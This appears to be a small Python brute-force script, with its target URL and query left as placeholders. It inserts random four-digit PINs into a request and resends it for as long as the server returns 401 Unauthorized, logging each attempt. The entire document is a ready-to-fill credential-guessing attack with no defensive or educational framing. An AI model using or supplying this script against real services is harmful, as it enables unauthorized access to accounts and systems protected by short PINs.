import random
import string
import requests


def ran_pass(length=4):
    characters = string.digits
    return "".join(random.choice(characters) for _ in range(length))


original_query = "thing"  # this thing goes here

url = "thing"  # that thing goes here
response = requests.get(url)

global counter
counter = 0


def repeat():
    global counter
    global response
    ran_password = ran_pass()
    modified_query = original_query.replace("THISPART", ran_password)
    response = requests.get(url, data=modified_query)
    print("============================")
    print("Output :: {} :: Status Code: {}".format(counter, response.status_code))
    print(response.text)
    print("Attempt :: {}".format(ran_password))
    print("============================")
    counter += 1


while response.status_code == 401:
    repeat()
